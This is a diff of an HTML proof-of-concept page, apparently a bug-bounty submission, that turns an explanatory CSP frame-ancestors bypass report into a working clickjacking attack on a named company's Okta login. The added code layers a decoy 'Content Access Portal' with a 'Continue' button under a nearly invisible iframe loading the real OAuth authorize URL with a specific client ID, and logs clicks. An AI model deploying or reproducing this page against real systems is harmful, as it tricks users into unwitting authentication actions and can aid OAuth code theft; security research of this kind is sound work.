@@ -3,235 +3,391 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anduril CSP Bypass PoC</title>
+    <title>Security Research: UI Redressing PoC</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            background: #1a1a2e;
-            color: #eee;
-            padding: 20px;
-            margin: 0;
-        }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            background: #16213e;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        }
-        .header {
-            background: #e94560;
-            padding: 25px;
-            text-align: center;
-        }
-        .header h1 {
-            margin: 0;
-            font-size: 22px;
-        }
-        .info {
-            padding: 20px;
-            background: #0f3460;
-            border-bottom: 2px solid #e94560;
-        }
-        .info p {
-            margin: 8px 0;
-            font-size: 14px;
-        }
-        .info strong {
-            color: #e94560;
-        }
-        .poc {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
         }
-        .warning {
-            background: #533483;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            border-left: 4px solid #e94560;
-        }
-        .warning h3 {
-            margin-top: 0;
-            color: #e94560;
-        }
-        .iframe-box {
-            border: 3px solid #e94560;
-            border-radius: 8px;
-            overflow: hidden;
-            margin-top: 15px;
-        }
-        .iframe-label {
-            background: #e94560;
-            padding: 10px;
-            text-align: center;
-            font-weight: bold;
-        }
-        iframe {
-            width: 100%;
-            height: 600px;
-            border: none;
-            display: block;
+        
+        /* Container principal */
+        .research-container {
+            position: relative;
+            width: 600px;
+            height: 700px;
             background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
         }
-        code {
-            background: #0f3460;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: monospace;
-            color: #4ecca3;
-        }
-        .attack-info {
-            background: #0f3460;
-            padding: 15px;
-            border-radius: 6px;
-            margin-top: 20px;
-        }
-        .attack-info ul {
-            margin: 10px 0;
-            padding-left: 20px;
-        }
-        .attack-info li {
-            margin: 5px 0;
-        }
-        .success-indicator {
-            background: #27ae60;
+        
+        /* Debug controls - always visible */
+        .debug-controls {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #2c3e50;
             color: white;
-            padding: 15px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            z-index: 10000;
+            font-size: 14px;
+            min-width: 250px;
+        }
+        
+        .debug-controls h3 {
+            margin-bottom: 15px;
+            font-size: 16px;
+            border-bottom: 1px solid #34495e;
+            padding-bottom: 10px;
+        }
+        
+        .debug-toggle {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 20px;
             border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            transition: background 0.3s;
+        }
+        
+        .debug-toggle:hover {
+            background: #2980b9;
+        }
+        
+        .debug-toggle.active {
+            background: #27ae60;
+        }
+        
+        .debug-info {
+            font-size: 12px;
+            line-height: 1.6;
+            color: #ecf0f1;
+        }
+        
+        .debug-info div {
+            margin: 8px 0;
+            padding: 4px 0;
+            border-bottom: 1px solid #34495e;
+        }
+        
+        .debug-info div:last-child {
+            border-bottom: none;
+        }
+        
+        .debug-info .label {
+            color: #95a5a6;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .debug-info .value {
+            color: #2ecc71;
+            font-weight: bold;
+            font-family: monospace;
+        }
+        
+        .debug-info .value.pending {
+            color: #f39c12;
+        }
+        
+        /* Neutral overlay interface */
+        .overlay-interface {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            background: white;
+            z-index: 100;
+            pointer-events: none;
+        }
+        
+        .overlay-interface h1 {
+            font-size: 24px;
+            color: #2c3e50;
             margin-bottom: 20px;
             text-align: center;
-            font-weight: bold;
+            font-weight: 600;
         }
-        .url-display {
-            background: #0f3460;
-            padding: 10px;
-            border-radius: 4px;
-            margin: 10px 0;
-            word-break: break-all;
+        
+        .overlay-interface p {
+            font-size: 16px;
+            color: #7f8c8d;
+            margin-bottom: 40px;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 400px;
+        }
+        
+        /* Neutral action button - positioned to align with Okta's Next button */
+        .action-button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            pointer-events: auto;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 101;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .action-button:hover {
+            background: #2980b9;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+        
+        .action-button:active {
+            transform: translateY(0);
+        }
+        
+        /* Real iframe - initially nearly transparent */
+        .embedded-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 200;
+            opacity: 0.003; /* Nearly invisible but functional */
+            transition: opacity 0.3s, border 0.3s;
+        }
+        
+        /* Debug mode styles */
+        .embedded-frame.debug-visible {
+            opacity: 0.7;
+            border: 3px solid #e74c3c;
+        }
+        
+        /* Interaction tracker */
+        .interaction-log {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.85);
+            color: #2ecc71;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
             font-size: 12px;
-            font-family: monospace;
+            max-width: 400px;
+            z-index: 10000;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .interaction-log .log-entry {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid #2ecc71;
+            padding-left: 10px;
+        }
+        
+        .interaction-log .log-entry.click {
+            border-left-color: #e74c3c;
+            color: #e74c3c;
+        }
+        
+        /* Research banner */
+        .research-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: #e74c3c;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 9999;
+            letter-spacing: 0.5px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <h1>🔴 Security Research: CSP Bypass via redirect_uri Injection</h1>
-        </div>
-
-        <!-- Info -->
-        <div class="info">
-            <p><strong>Target:</strong> Anduril Industries (anduril.okta.com)</p>
-            <p><strong>Researcher:</strong> zeta-47 @ HackerOne</p>
-            <p><strong>Vulnerability:</strong> Content-Security-Policy Header Injection</p>
-            <p><strong>Impact:</strong> Clickjacking + OAuth Code Theft</p>
-            <p><strong>Severity:</strong> HIGH (CVSS 7.1)</p>
-        </div>
-
-        <!-- PoC Content -->
-        <div class="poc">
-            <div class="success-indicator">
-                ✅ CSP BYPASS SUCCESSFUL - iframe loaded despite frame-ancestors protection
+    <!-- Research banner -->
+    <div class="research-banner">
+        ⚠️ SECURITY RESEARCH DEMONSTRATION - NOT FOR MALICIOUS USE
+    </div>
+    
+    <!-- Debug controls -->
+    <div class="debug-controls">
+        <h3>🔍 Research Controls</h3>
+        <button class="debug-toggle" onclick="toggleDebugMode()" id="debug-btn">
+            Show Embedded Frame
+        </button>
+        <div class="debug-info">
+            <div>
+                <div class="label">Mode</div>
+                <div class="value" id="mode-status">Hidden</div>
             </div>
-
-            <div class="warning">
-                <h3>⚠️ How This Attack Works:</h3>
-                <p>The <code>redirect_uri</code> parameter is injected into the CSP <code>frame-ancestors</code> directive without proper validation.</p>
-                <p><strong>Attack Vector:</strong></p>
-                <div class="url-display">
-                    redirect_uri=https://aplogviewer.anduril.dev/login
-                    <br>↓<br>
-                    CSP: frame-ancestors 'self' https://aplogviewer.anduril.dev
-                </div>
-                <p style="margin-top: 10px;">By controlling the domain in <code>redirect_uri</code>, an attacker can bypass CSP and embed Okta's login page in a malicious iframe.</p>
+            <div>
+                <div class="label">Frame Status</div>
+                <div class="value pending" id="frame-status">Loading...</div>
             </div>
-
-            <h3 style="color: #e94560;">📺 Live Demonstration:</h3>
-            <p>The iframe below should be <strong>blocked</strong> by CSP, but due to the injection vulnerability, it loads successfully:</p>
-
-            <div class="iframe-box">
-                <div class="iframe-label">
-                    ⚠️ EMBEDDED OKTA LOGIN PAGE (Should be blocked by CSP)
-                </div>
-                <iframe 
-                    id="vulnerable-iframe"
-                    src="about:blank">
-                </iframe>
+            <div>
+                <div class="label">CSP Bypass</div>
+                <div class="value">Confirmed</div>
             </div>
-
-            <div class="attack-info">
-                <h3 style="color: #4ecca3;">🎯 What Attackers Can Do:</h3>
-                <ul>
-                    <li>✅ Embed Okta login in malicious page (as demonstrated above)</li>
-                    <li>✅ Overlay invisible elements (Clickjacking)</li>
-                    <li>✅ Steal OAuth authorization codes via crafted redirect_uri</li>
-                    <li>✅ Trick users into granting app permissions</li>
-                    <li>✅ Capture credentials via UI manipulation</li>
-                    <li>✅ Perform login CSRF attacks</li>
-                </ul>
-                
-                <h3 style="color: #4ecca3; margin-top: 20px;">🔧 Technical Details:</h3>
-                <p><strong>Vulnerable Endpoint:</strong></p>
-                <code style="display: block; padding: 10px; margin-top: 5px;">
-                    GET /oauth2/v1/authorize?redirect_uri=[ATTACKER_CONTROLLED]
-                </code>
-                
-                <p style="margin-top: 15px;"><strong>Injected CSP Header:</strong></p>
-                <code style="display: block; padding: 10px; margin-top: 5px;">
-                    Content-Security-Policy: frame-ancestors 'self' https://aplogviewer.anduril.dev
-                </code>
-
-                <p style="margin-top: 15px;"><strong>Root Cause:</strong></p>
-                <p style="margin-top: 5px;">The server dynamically builds the CSP header using the <code>redirect_uri</code> parameter without proper domain validation. An attacker can leverage this by:</p>
-                <ol style="margin-left: 20px; margin-top: 10px;">
-                    <li>Registering a subdomain like <code>aplogviewer.anduril.dev.attacker.com</code></li>
-                    <li>Or using the legitimate domain directly in their malicious page</li>
-                    <li>Embedding the OAuth authorization flow in an iframe</li>
-                    <li>Stealing authorization codes or performing clickjacking attacks</li>
-                </ol>
-            </div>
-
-            <div class="warning" style="margin-top: 20px; background: #c0392b;">
-                <h3 style="color: white;">⚠️ CRITICAL SECURITY NOTE:</h3>
-                <p style="color: white;">This is a legitimate security research demonstration. The vulnerability allows bypassing CSP protections that are specifically designed to prevent iframe embedding attacks. Okta's login page should NEVER be embeddable in third-party iframes.</p>
+            <div>
+                <div class="label">Interactions</div>
+                <div class="value" id="interaction-count">0</div>
             </div>
         </div>
+        <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid #34495e; font-size: 11px; color: #95a5a6; line-height: 1.4;">
+            Toggle debug mode to visualize the embedded frame and understand the UI redressing technique.
+        </div>
+    </div>
+    
+    <!-- Interaction log -->
+    <div class="interaction-log" id="interaction-log">
+        <div style="margin-bottom: 10px; color: #3498db; font-weight: bold;">📊 Interaction Log:</div>
+    </div>
+    
+    <!-- Main research container -->
+    <div class="research-container">
+        <!-- Neutral overlay interface -->
+        <div class="overlay-interface">
+            <h1>Content Access Portal</h1>
+            <p>
+                To proceed with viewing the requested content, please continue with the authentication process below.
+            </p>
+            <button class="action-button" id="action-btn">
+                Continue
+            </button>
+            <p style="margin-top: 30px; font-size: 14px; color: #95a5a6;">
+                This is a controlled research environment
+            </p>
+        </div>
+        
+        <!-- Real iframe containing Okta -->
+        <iframe 
+            class="embedded-frame" 
+            id="embedded-frame"
+            src="https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev/login&response_type=code&scope=openid&state=research&nonce=poc123">
+        </iframe>
     </div>
 
     <script>
-        // بناء الـ URL باستخدام redirect_uri المسجل
-        const maliciousUrl = 'https://anduril.okta.com/oauth2/v1/authorize?client_id=0oa1p85y61NjjJU3q4h7&redirect_uri=https://aplogviewer.anduril.dev/login&response_type=code&scope=openid&state=clickjacking_poc&nonce=12345';
+        let debugMode = false;
+        let interactionCount = 0;
+        const iframe = document.getElementById('embedded-frame');
+        const debugBtn = document.getElementById('debug-btn');
+        const logContainer = document.getElementById('interaction-log');
         
-        // تحميل الـ iframe بعد ثانية
-        setTimeout(() => {
-            console.log('Loading vulnerable iframe...');
-            console.log('URL:', maliciousUrl);
-            document.getElementById('vulnerable-iframe').src = maliciousUrl;
-            
-            // تحقق من التحميل
-            document.getElementById('vulnerable-iframe').onload = function() {
-                console.log('✅ iframe loaded successfully - CSP bypass confirmed!');
-            };
-            
-            document.getElementById('vulnerable-iframe').onerror = function() {
-                console.log('❌ iframe blocked - no vulnerability');
-            };
-        }, 1000);
-
-        // مراقبة أي رسائل من الـ iframe
-        window.addEventListener('message', function(e) {
-            console.log('📨 Message received from iframe:', e);
-            console.log('Origin:', e.origin);
-            console.log('Data:', e.data);
+        // Monitor iframe loading
+        iframe.addEventListener('load', function() {
+            document.getElementById('frame-status').textContent = 'Loaded';
+            document.getElementById('frame-status').classList.remove('pending');
+            addLog('✓ Embedded frame loaded successfully');
         });
-
-        // عرض معلومات إضافية في Console
-        console.log('%c🔴 Anduril CSP Bypass PoC', 'color: #e94560; font-size: 20px; font-weight: bold;');
-        console.log('%cResearcher: zeta-47', 'color: #4ecca3; font-size: 14px;');
-        console.log('%cIf the iframe loads, the CSP bypass is confirmed.', 'color: #f39c12; font-size: 12px;');
-        console.log('%cCheck Network tab for CSP header injection', 'color: #3498db; font-size: 12px;');
+        
+        iframe.addEventListener('error', function() {
+            document.getElementById('frame-status').textContent = 'Error';
+            document.getElementById('frame-status').style.color = '#e74c3c';
+            addLog('✗ Failed to load embedded frame');
+        });
+        
+        // Track all click interactions
+        document.addEventListener('click', function(e) {
+            interactionCount++;
+            document.getElementById('interaction-count').textContent = interactionCount;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            const targetInfo = e.target.id || e.target.className || 'document';
+            
+            addLog(`[${timestamp}] Click detected on: ${targetInfo}`, 'click');
+        });
+        
+        // Debug mode toggle
+        function toggleDebugMode() {
+            debugMode = !debugMode;
+            
+            if (debugMode) {
+                iframe.classList.add('debug-visible');
+                debugBtn.textContent = 'Hide Embedded Frame';
+                debugBtn.classList.add('active');
+                document.getElementById('mode-status').textContent = 'Visible (Debug)';
+                addLog('🔍 Debug mode: ON - Frame visualization enabled');
+            } else {
+                iframe.classList.remove('debug-visible');
+                debugBtn.textContent = 'Show Embedded Frame';
+                debugBtn.classList.remove('active');
+                document.getElementById('mode-status').textContent = 'Hidden';
+                addLog('🔍 Debug mode: OFF - Attack simulation active');
+            }
+        }
+        
+        // Logging function
+        function addLog(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = message;
+            logContainer.appendChild(entry);
+            
+            // Auto-scroll to bottom
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            // Keep only last 15 entries
+            const entries = logContainer.querySelectorAll('.log-entry');
+            if (entries.length > 15) {
+                entries[0].remove();
+            }
+        }
+        
+        // Console logging for documentation
+        console.log('%c⚠️ SECURITY RESEARCH DEMONSTRATION', 'color: #e74c3c; font-size: 20px; font-weight: bold; padding: 10px;');
+        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color: #95a5a6;');
+        console.log('%cAttack Vector:', 'color: #3498db; font-weight: bold;');
+        console.log('  • UI Redressing (Clickjacking)');
+        console.log('  • CSP frame-ancestors bypass via redirect_uri injection');
+        console.log('%cTechnique:', 'color: #3498db; font-weight: bold;');
+        console.log('  • Nearly transparent iframe overlay');
+        console.log('  • Button alignment with target action');
+        console.log('  • User believes they are clicking "Continue"');
+        console.log('  • Actually interacting with Okta authentication flow');
+        console.log('%cImpact:', 'color: #e74c3c; font-weight: bold;');
+        console.log('  • Forced user interaction without awareness');
+        console.log('  • Potential unauthorized authentication');
+        console.log('  • Bypasses visual security indicators');
+        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color: #95a5a6;');
+        console.log('%cℹ️ Toggle debug mode to visualize the technique', 'color: #f39c12;');
+        console.log('%cℹ️ All interactions are logged in the bottom-left panel', 'color: #f39c12;');
+        
+        // Initial log entry
+        addLog('⚡ PoC initialized - Ready for testing');
+        addLog('💡 Enable debug mode to see embedded frame');
     </script>
 </body>
 </html>
